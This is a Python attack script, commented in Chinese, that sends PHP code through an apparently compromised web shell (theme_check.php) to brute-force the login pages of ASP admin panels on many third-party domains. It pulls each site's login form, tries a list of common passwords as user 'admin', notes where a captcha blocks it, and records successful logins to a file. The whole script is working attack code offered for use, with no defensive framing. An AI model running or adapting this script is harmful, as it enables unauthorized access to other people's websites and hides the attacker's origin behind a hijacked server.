#!/usr/bin/env python3
"""jump_asp_bf2.py - 通过theme_check.php(81.70命令执行)爆破ASP后台
每个目标: 先用PHP curl GET表单分析, 再POST试密码
"""
import urllib.request, urllib.parse, ssl, re, sys, time, json
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
SHELL = 'http://127.0.0.1:13080/theme_check.php'

BIG = ['jd.com', 'renrendoc.com', 'cjtl.com']
PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888"]

def php_exec(code):
    """通过theme_check.php执行PHP代码, 返回stdout"""
    try:
        req = urllib.request.Request(SHELL, data=urllib.parse.urlencode({'x': code}).encode(),
                                     headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded'})
        r = urllib.request.urlopen(req, timeout=20, context=ctx)
        return r.read(30000).decode('utf-8', 'ignore')
    except Exception as e:
        return 'ERR:' + repr(e)[:80]

def get_form(dom, path):
    """PHP curl GET表单"""
    url = 'http://' + dom + path
    code = ('$ch=curl_init("%s");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);'
            'curl_setopt($ch,CURLOPT_TIMEOUT,12);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);'
            '$r=curl_exec($ch);echo $r;' % url)
    out = php_exec(code)
    if out.startswith('ERR') or len(out) < 300:
        return None
    fields = re.findall(r'<input[^>]*name="([^"]+)"', out, re.I)
    action = re.search(r'<form[^>]*action="([^"]*)"', out, re.I)
    form_action = action.group(1) if action else path
    if not form_action.startswith('http'):
        form_action = 'http://' + dom + (form_action if form_action.startswith('/') else '/' + form_action)
    return {'fields': fields, 'action': form_action}

def do_login(form_action, data_dict):
    """PHP curl POST登录"""
    # 构造POST字段
    fields_php = 'array(' + ','.join(
        "'%s'=>'%s'" % (k.replace("'", "\\'"), v.replace("'", "\\'")) for k, v in data_dict.items()
    ) + ')'
    code = ('$ch=curl_init("%s");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);'
            'curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,%s);'
            'curl_setopt($ch,CURLOPT_TIMEOUT,12);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);'
            'curl_setopt($ch,CURLOPT_HEADER,1);$r=curl_exec($ch);echo $r;' % (form_action, fields_php))
    return php_exec(code)

def brute(entry):
    dom, path = entry
    info = get_form(dom, path)
    if not info:
        return None
    fields = info['fields']
    if not fields:
        return None
    uf = next((f for f in fields if f.lower() in ('username', 'user', 'name', 'account', 'admin', 'loginname')), None)
    pf = next((f for f in fields if 'pass' in f.lower() or 'pwd' in f.lower()), None)
    if not uf or not pf:
        return None
    allf = ' '.join(fields).lower()
    has_cap = any(k in allf for k in ['checkcode', 'captcha', 'verify', 'validate', 'code', 'yzm'])
    for pw in PASSWORDS:
        data = {f: '' for f in fields}
        data[uf] = 'admin'
        data[pf] = pw
        resp = do_login(info['action'], data)
        if resp.startswith('ERR'):
            return ('ERR', dom, path, resp[:60])
        low = resp.lower()
        fail = any(m in resp for m in ['错误', '失败', '不正确', 'invalid', 'wrong password', 'error'])
        if not fail:
            # 成功标志: 302跳转非login 或 后台特征
            if 'location:' in low and 'login' not in low.split('location:')[-1][:60]:
                return ('HIT', dom, path, 'admin', pw, '302')
            if any(k in low for k in ['logout', '退出', '管理首页', '欢迎', 'main.asp', 'index.asp?']):
                return ('HIT', dom, path, 'admin', pw, 'body')
    return ('DONE', dom, path, 'captcha' if has_cap else 'nohit')

def main():
    entries = []
    with open('/tmp/jump_asp_hits.tsv') as f:
        for line in f:
            parts = line.strip().split('\t')
            if len(parts) >= 3 and parts[0] == 'ADMIN':
                full = parts[1]
                dom = full.split('/')[0]
                path = '/' + '/'.join(full.split('/')[1:])
                if dom not in BIG:
                    entries.append((dom, path))
    print('targets: %d' % len(entries), flush=True)
    results = []
    with ThreadPoolExecutor(max_workers=4) as ex:
        futs = {ex.submit(brute, e): e for e in entries}
        for fu in as_completed(futs):
            try:
                r = fu.result()
            except Exception:
                r = None
            if r:
                results.append(r)
                print('RESULT: %s' % '\t'.join(str(x) for x in r), flush=True)
    with open('/tmp/jump_bf2_results.txt', 'w') as f:
        for r in results:
            f.write('\t'.join(str(x) for x in r) + '\n')
    print('=== DONE ===', flush=True)

if __name__ == '__main__':
    main()
